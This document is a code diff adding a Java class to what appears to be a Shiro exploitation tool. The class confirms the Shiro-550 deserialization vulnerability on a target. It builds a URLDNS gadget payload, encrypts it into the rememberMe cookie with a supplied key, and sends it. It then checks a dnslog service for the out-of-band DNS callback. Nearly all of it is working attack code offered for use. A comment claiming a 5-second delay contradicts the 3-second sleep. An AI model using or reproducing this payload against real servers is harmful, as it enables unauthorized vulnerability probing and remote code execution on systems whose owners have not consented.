@@ -1,0 +1,61 @@
+package com.y5neko.shiroexp.payloads;
+
+import com.y5neko.shiroexp.misc.DnslogConfig;
+import com.y5neko.shiroexp.misc.Tools;
+import com.y5neko.shiroexp.gadget.URLDNS;
+import com.y5neko.shiroexp.request.HttpRequest;
+import com.y5neko.shiroexp.request.ResponseOBJ;
+import okhttp3.FormBody;
+
+import javax.crypto.BadPaddingException;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.security.InvalidAlgorithmParameterException;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+import java.util.*;
+
+public class Shiro550VerifyByURLDNS {
+    public static String verify(TargetOBJ targetOBJ) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException, InterruptedException {
+        System.out.println("[" + Tools.color("INFO", "BLUE") + "] 正在通过URLDNS利用链进行验证");
+        // 处理得到URLDNS的payload字节码
+        String verifyRandom = Tools.generateRandomString(8);
+        // 获取dnslog平台信息
+        System.out.println("[" + Tools.color("INFO", "BLUE") + "] 正在获取dnslog平台信息");
+        String[] dnslogInfo = DnslogConfig.getDnslogDomain();
+        String dnslogBaseURL = dnslogInfo[0];
+        System.out.println("[" + Tools.color("INFO", "BLUE") + "] dnslog平台地址: http://javaweb.org/");
+        System.out.println("[" + Tools.color("INFO", "BLUE") + "] dnslog验证地址: " + "http://" + verifyRandom + "." + dnslogBaseURL);
+        System.out.println("[" + Tools.color("INFO", "BLUE") + "] dnslog查询Token: " + dnslogInfo[2]);
+        System.out.println("[" + Tools.color("INFO", "BLUE") + "] dnslog查询Key: " + dnslogInfo[1]);
+
+        byte[] URLDNS_Payload = URLDNS.genPayload("http://" + verifyRandom + "." + dnslogBaseURL);
+
+        // 得到最终rememberMe的值
+        String payload = Tools.CBC_Encrypt(targetOBJ.getKey(), Base64.getEncoder().encodeToString(URLDNS_Payload));
+//        System.out.println(payload);
+        // 在自定义Cookie后添加Cookie字段(cookie;rememberMe=test123)
+        Map<String, String> headers = targetOBJ.getCookie();
+        headers.compute("Cookie", (k, cookie) -> cookie + ";" + targetOBJ.getRememberMeFlag() + "=" + payload);
+
+        // 发送payload
+        HttpRequest.httpRequest(targetOBJ.getUrl(), new FormBody.Builder().build(), headers, "GET");
+
+        // 延时5s进行查询，防止延时误报
+        System.out.println("[" + Tools.color("INFO", "BLUE") + "] 正在验证，延时3秒防止漏报");
+        Thread.sleep(3000);
+        String dnslogRecord = DnslogConfig.getDnslogRecord(dnslogInfo);
+        if (dnslogRecord.contains(verifyRandom)){
+            System.out.println("[" + Tools.color("SUCC", "GREEN") + "] 验证成功，目标存在Shiro550漏洞且出网");
+            return "成功";
+        }
+        System.out.println("[" + Tools.color("INFO", "YELLOW") + "] 验证失败: 目标不存在漏洞或不出网，请手动查询dnslog或直接爆破回显链");
+        return "失败";
+    }
+
+    public static void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException, InterruptedException {
+        verify(new TargetOBJ("http://127.0.0.1:8080"));
+    }
+}
